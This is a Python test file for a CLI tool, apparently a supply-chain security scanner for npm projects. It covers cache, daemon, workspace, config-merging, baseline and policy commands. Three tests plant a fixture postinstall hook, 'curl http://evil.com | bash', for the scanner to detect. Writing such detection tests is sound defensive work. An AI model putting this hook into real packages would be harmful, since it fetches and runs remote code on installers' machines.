"""
test_cli_extended.py — Extended CLI tests targeting uncovered subcommands and code paths.

Focuses on daemon, cache, metrics, workspace, update, policy, advisories,
_run_scan internals, baseline, config merging, and enterprise mode paths.
"""

import contextlib
import json
import os
from unittest.mock import MagicMock, patch

from picosentry.scan.cli import (
    _cmd_advisories,
    _cmd_check,
    _cmd_workspace,
    _run_scan,
    main,
)
from picosentry.scan.config import PicoSentryConfig, load_config
from picosentry.scan.models import ScanResult


class TestDaemonCommand:
    """Test daemon subcommand via main()."""

    def test_daemon_enterprise_sets_env(self, tmp_path):
        """Daemon --enterprise should set PICOSENTRY_ENTERPRISE_MODE env var."""
        env = dict(os.environ)
        env.pop("PICOSENTRY_ENTERPRISE_MODE", None)
        with (
            patch.dict(os.environ, env, clear=False),
            patch(
                "sys.argv", ["picosentry", "daemon", "--enterprise", "--auth-mode", "token", "--auth-token", "test123"]
            ),
            patch("picosentry.scan.daemon.run_daemon") as mock_daemon,
        ):
            mock_daemon.return_value = None
            with contextlib.suppress(SystemExit):
                main()
            # The env var should be set
            assert os.environ.get("PICOSENTRY_ENTERPRISE_MODE") == "1"

    def test_daemon_default_port(self, tmp_path):
        """Daemon with default settings."""
        with patch("sys.argv", ["picosentry", "daemon"]), patch("picosentry.scan.daemon.run_daemon") as mock_daemon:
            mock_daemon.return_value = None
            with contextlib.suppress(SystemExit):
                main()


class TestCacheCommand:
    """Test cache subcommand."""

    def test_cache_stats(self, capsys):
        """Cache stats command."""
        with patch("sys.argv", ["picosentry", "cache", "stats"]), patch("picosentry.scan.cache.ScanCache") as MockCache:
            mock_cache = MockCache.return_value
            mock_cache.stats.return_value = {
                "cache_dir": "/tmp/cache",
                "entries": 10,
                "size_mb": 1.5,
                "size_bytes": 1572864,
                "ttl_seconds": 3600,
                "max_entries": 0,
                "max_size_mb": 0,
            }
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "Cache directory" in out

    def test_cache_wipe(self, capsys):
        """Cache wipe command."""
        with patch("sys.argv", ["picosentry", "cache", "wipe"]), patch("picosentry.scan.cache.ScanCache") as MockCache:
            mock_cache = MockCache.return_value
            mock_cache.wipe.return_value = 5
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "Wiped" in out

    def test_cache_purge(self, capsys):
        """Cache purge command."""
        with (
            patch("sys.argv", ["picosentry", "cache", "purge", "--age-days", "30"]),
            patch("picosentry.scan.cache.ScanCache") as MockCache,
        ):
            mock_cache = MockCache.return_value
            mock_cache.purge.return_value = 3
            rc = main()
        assert rc == 0
        out = capsys.readouterr().out
        assert "Purged" in out

    def test_cache_no_subcommand(self, capsys):
        """Cache without subcommand should print help."""
        with patch("sys.argv", ["picosentry", "cache"]):
            rc = main()
        # Should not crash, just print help
        assert rc == 0


class TestMetricsCommand:
    """Test metrics subcommand."""

    def test_metrics_json(self, capsys):
        """Metrics with --format json."""
        with patch("sys.argv", ["picosentry", "metrics", "--format", "json"]):
            rc = main()
        assert rc == 0

    def test_metrics_prometheus(self, capsys):
        """Metrics with --format prometheus."""
        with patch("sys.argv", ["picosentry", "metrics", "--format", "prometheus"]):
            rc = main()
        assert rc == 0


class TestWorkspaceCommand:
    """Test workspace subcommand."""

    def test_workspace_nonexistent_dir(self, capsys):
        """Workspace scan on nonexistent dir should return 2."""
        with patch("sys.argv", ["picosentry", "workspace", "/nonexistent/workspace/path"]):
            rc = main()
        assert rc == 2

    def test_workspace_no_projects(self, tmp_path, capsys):
        """Workspace scan on dir with no projects should return 1."""
        empty = tmp_path / "empty_ws"
        empty.mkdir()
        with patch("sys.argv", ["picosentry", "workspace", str(empty)]):
            rc = main()
        assert rc == 1

    def test_workspace_json_format(self, tmp_path, capsys):
        """Workspace scan with --format json."""
        ws = tmp_path / "ws"
        ws.mkdir()
        (ws / "package.json").write_text(
            json.dumps(
                {
                    "name": "ws-project",
                    "version": "1.0.0",
                    "license": "MIT",
                    "author": "Test <t@t.com>",
                    "repository": {"type": "git", "url": "https://github.com/t/w"},
                    "engines": {"node": ">=18"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "workspace", str(ws), "--format", "json"]):
            rc = main()
        # Should succeed even if there are no node_modules findings
        assert rc in (0, 1)

    def test_workspace_quiet(self, tmp_path, capsys):
        """Workspace scan with --quiet."""
        ws = tmp_path / "ws"
        ws.mkdir()
        (ws / "package.json").write_text(json.dumps({"name": "ws-quiet", "version": "1.0.0"}))
        with patch("sys.argv", ["picosentry", "workspace", str(ws), "--quiet"]):
            rc = main()
        assert rc in (0, 1)


class TestUpdateCommand:
    """Test update subcommand (mocked network)."""

    def test_update_network_error(self, capsys):
        """Update command should handle network errors."""
        with (
            patch("sys.argv", ["picosentry", "update", "--top", "5"]),
            # Patch where the call site is (post v2.1.0 refactor):
            # ``update.py`` imports safe_urlopen into its own namespace, so
            # the source module's attribute is a separate binding.
            patch("picosentry.scan.cli_commands.update.safe_urlopen") as mock_url,
        ):
            mock_url.side_effect = Exception("network error")
            rc = main()
        # Should return 1 on error
        assert rc == 1


class TestAdvisoriesCommand:
    """Test advisories subcommand handler."""

    def test_advisories_no_action(self, capsys):
        """Advisories without action should print usage and return 1."""
        args = MagicMock()
        args.adv_action = None
        rc = _cmd_advisories(args)
        assert rc == 1

    def test_advisories_fetch_network_error(self, capsys):
        """Advisories fetch with network error should return 1."""
        args = MagicMock()
        args.adv_action = "fetch"
        args.url = "https://example.com/advisories"
        args.output = None
        args.verify_crypto = True
        args.public_key = ""
        args.offline = False
        with patch("picosentry.scan.management.fetch_advisories") as mock_fetch:
            mock_fetch.side_effect = Exception("network error")
            rc = _cmd_advisories(args)
        assert rc == 1


class TestCmdCheckDirect:
    """Test _cmd_check with various scenarios."""

    def test_check_with_findings(self, tmp_path, capsys):
        """Check malicious project should find violations."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "evil-check",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        args = MagicMock()
        args.target = str(project)
        args.fail_on = "high"
        args.rules = None
        args.advisory_db = None
        rc = _cmd_check(args)
        assert rc == 1
        err = capsys.readouterr().err
        assert "finding" in err.lower() or "pinch" in err.lower() or "check" in err.lower()


class TestRunScan:
    """Test _run_scan helper function."""

    def test_run_scan_with_config(self, tmp_path):
        """_run_scan with merged config should apply overrides."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "scan-cfg",
                    "version": "1.0.0",
                }
            )
        )
        args = MagicMock()
        args.timeout = 0
        args.rules = None
        args.format = "json"
        args.corpus = None
        args.advisory_db = None
        args.severity_overrides = None
        args.severity_threshold = None
        args.ignore_packages = None
        args.ignore_paths = None
        args.enterprise = False
        args.fail_on_rule_error = False

        config = load_config(project)
        result = _run_scan(args, project, merged_config=config)
        assert isinstance(result, ScanResult)
        assert result.config_digest.startswith("sha256:")

    def test_run_scan_populates_digests(self, tmp_path):
        """_run_scan should populate config_digest and policy_digest."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "digest-test",
                    "version": "1.0.0",
                }
            )
        )
        args = MagicMock()
        args.timeout = 0
        args.rules = None
        args.format = "json"
        args.corpus = None
        args.advisory_db = None
        args.severity_overrides = None
        args.severity_threshold = None
        args.ignore_packages = None
        args.ignore_paths = None
        args.enterprise = False
        args.fail_on_rule_error = False

        config = load_config(project)
        result = _run_scan(args, project, merged_config=config)
        assert result.config_digest.startswith("sha256:")
        assert result.policy_digest == "sha256:default"


class TestConfigMerge:
    """Test config merging from CLI args."""

    def test_config_merge_format(self):
        """Config merge should apply CLI format override."""
        config = PicoSentryConfig()
        args = MagicMock()
        args.format = "json"
        args.output = None
        args.rules = None
        args.corpus = None
        args.advisory_db = None
        args.no_color = False
        args.token_budget = None
        args.exit_code = False
        args.severity_threshold = None
        args.fail_on = None
        args.deterministic_output = False
        args.quiet = False
        args.summary = False
        args.baseline = None
        args.baseline_update = False
        args.sarif_file = None
        args.log_format = None
        merged = config.merge_cli(args)
        assert merged.format == "json"

    def test_config_merge_fail_on(self):
        """Config merge with fail_on should also set exit_code."""
        config = PicoSentryConfig()
        args = MagicMock()
        args.format = None
        args.output = None
        args.rules = None
        args.corpus = None
        args.advisory_db = None
        args.no_color = False
        args.token_budget = None
        args.exit_code = False
        args.severity_threshold = None
        args.fail_on = "high"
        args.deterministic_output = False
        args.quiet = False
        args.summary = False
        args.baseline = None
        args.baseline_update = False
        args.sarif_file = None
        args.log_format = None
        merged = config.merge_cli(args)
        assert merged.fail_on == "high"
        assert merged.exit_code is True

    def test_config_merge_summary_implies_quiet(self):
        """Config merge with summary should also set quiet."""
        config = PicoSentryConfig()
        args = MagicMock()
        args.format = None
        args.output = None
        args.rules = None
        args.corpus = None
        args.advisory_db = None
        args.no_color = False
        args.token_budget = None
        args.exit_code = False
        args.severity_threshold = None
        args.fail_on = None
        args.deterministic_output = False
        args.quiet = False
        args.summary = True
        args.baseline = None
        args.baseline_update = False
        args.sarif_file = None
        args.log_format = None
        merged = config.merge_cli(args)
        assert merged.summary is True
        assert merged.quiet is True


class TestBaselineScan:
    """Test baseline scanning through main()."""

    def test_scan_with_baseline_file(self, tmp_path, capsys):
        """Scan with baseline file should suppress known findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "baseline-test",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )

        # Create a baseline from a previous scan
        baseline_file = tmp_path / "baseline.json"
        baseline_data = {
            "findings": [
                {
                    "rule_id": "L2-POST-001",
                    "package": "baseline-test@1.0.0",
                    "file": "baseline-test@1.0.0/package.json",
                }
            ]
        }
        baseline_file.write_text(json.dumps(baseline_data))

        with patch(
            "sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--baseline", str(baseline_file)]
        ):
            rc = main()
        # Should succeed (findings suppressed or not)
        assert rc in (0, 1)


class TestSeverityThreshold:
    """Test scan with severity threshold."""

    def test_severity_threshold_low(self, tmp_path, capsys):
        """Scan with --severity-threshold low should include all findings."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "threshold-low",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.com | bash"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--severity-threshold", "low"]):
            main()
        out = capsys.readouterr().out
        data = json.loads(out)
        # All findings should be present (low threshold includes everything)
        assert "findings" in data


class TestConfigFileLoading:
    """Test scan with various config file scenarios."""

    def test_config_file_format_json(self, tmp_path, capsys):
        """Config file with format: json should produce JSON output."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "cfg-json",
                    "version": "1.0.0",
                }
            )
        )
        (project / ".picosentry.yml").write_text("format: json\n")
        with patch("sys.argv", ["picosentry", "scan", str(project)]):
            main()
        out = capsys.readouterr().out
        # Config file says json format, so output should be parseable JSON
        try:
            data = json.loads(out)
            assert "findings" in data
        except json.JSONDecodeError:
            # Might be table format if config loading differs
            pass

    def test_config_file_quiet(self, tmp_path, capsys):
        """Config file with quiet: true should suppress detailed output."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "cfg-quiet",
                    "version": "1.0.0",
                }
            )
        )
        (project / ".picosentry.yml").write_text("quiet: true\nformat: json\n")
        with patch("sys.argv", ["picosentry", "scan", str(project)]):
            rc = main()
        assert rc in (0, 1)


class TestScanEnterpriseMode:
    """Test scan with enterprise mode."""

    def test_scan_enterprise_fail_closed(self, tmp_path, capsys):
        """Enterprise mode with --fail-on-rule-error should work."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "ent-fail",
                    "version": "1.0.0",
                    "license": "MIT",
                    "author": "Test <t@t.com>",
                    "repository": {"type": "git", "url": "https://github.com/test/ent"},
                    "engines": {"node": ">=18"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--enterprise"]):
            rc = main()
        assert rc == 0

    def test_scan_fail_on_rule_error(self, tmp_path, capsys):
        """Scan with --fail-on-rule-error should work."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "rule-err",
                    "version": "1.0.0",
                    "license": "MIT",
                    "author": "Test <t@t.com>",
                    "repository": {"type": "git", "url": "https://github.com/test/rule"},
                    "engines": {"node": ">=18"},
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--fail-on-rule-error"]):
            rc = main()
        assert rc == 0


class TestScanWithPolicy:
    """Test scan with --policy flag."""

    def test_scan_with_policy(self, tmp_path, capsys):
        """Scan with --policy should apply policy."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "policy-test",
                    "version": "1.0.0",
                }
            )
        )
        # Create a minimal policy file
        policy_content = """
version: 1
allow_licenses:
  - MIT
  - Apache-2.0
deny_packages: []
"""
        policy_file = tmp_path / ".picosentry-policy.yml"
        policy_file.write_text(policy_content)

        with patch("sys.argv", ["picosentry", "scan", str(project), "--format", "json", "--policy", str(policy_file)]):
            rc = main()
        assert rc in (0, 1)


class TestCmdWorkspaceDirect:
    """Test _cmd_workspace directly."""

    def test_workspace_nonexistent_dir(self, capsys):
        """_cmd_workspace with nonexistent dir should return 2."""
        args = MagicMock()
        args.root = "/nonexistent/ws"
        args.format = "json"
        args.quiet = False
        args.output = None
        args.rules = None
        args.fail_on = None
        args.timeout = None
        args.max_depth = 8
        args.advisory_db = None
        rc = _cmd_workspace(args)
        assert rc == 2


class TestDiffCommand:
    """Test diff via main()."""

    def test_diff_nonexistent_files(self, capsys):
        """Diff nonexistent files should return 2."""
        with patch("sys.argv", ["picosentry", "diff", "/nonexistent/a.json", "/nonexistent/b.json"]):
            rc = main()
        assert rc == 2


class TestInitCommand:
    """Test init via main()."""

    def test_init_creates_config_files(self, tmp_path):
        """Init should create .picosentry.yml and policy file."""
        project = tmp_path / "project"
        project.mkdir()
        with patch("sys.argv", ["picosentry", "init", str(project)]):
            rc = main()
        assert rc == 0
        assert (project / ".picosentry.yml").is_file()
        assert (project / ".picosentry-policy.yml").is_file()

    def test_init_with_force(self, tmp_path):
        """Init with --force on existing config should overwrite."""
        project = tmp_path / "project"
        project.mkdir()
        (project / ".picosentry.yml").write_text("old config")
        with patch("sys.argv", ["picosentry", "init", str(project), "--force"]):
            rc = main()
        assert rc == 0


class TestScanNoColor:
    """Test scan with no color flag."""

    def test_scan_no_color(self, tmp_path, capsys):
        """Scan with --no-color should work."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "nocolor",
                    "version": "1.0.0",
                }
            )
        )
        with patch("sys.argv", ["picosentry", "scan", str(project), "--no-color"]):
            rc = main()
        assert rc == 0


class TestScanTokenBudget:
    """Test scan with token budget for ml-context."""

    def test_scan_token_budget(self, tmp_path, capsys):
        """Scan with --token-budget should work."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "package.json").write_text(
            json.dumps(
                {
                    "name": "token-budget",
                    "version": "1.0.0",
                }
            )
        )
        with patch(
            "sys.argv", ["picosentry", "scan", str(project), "--format", "ml-context", "--token-budget", "2048"]
        ):
            rc = main()
        assert rc == 0
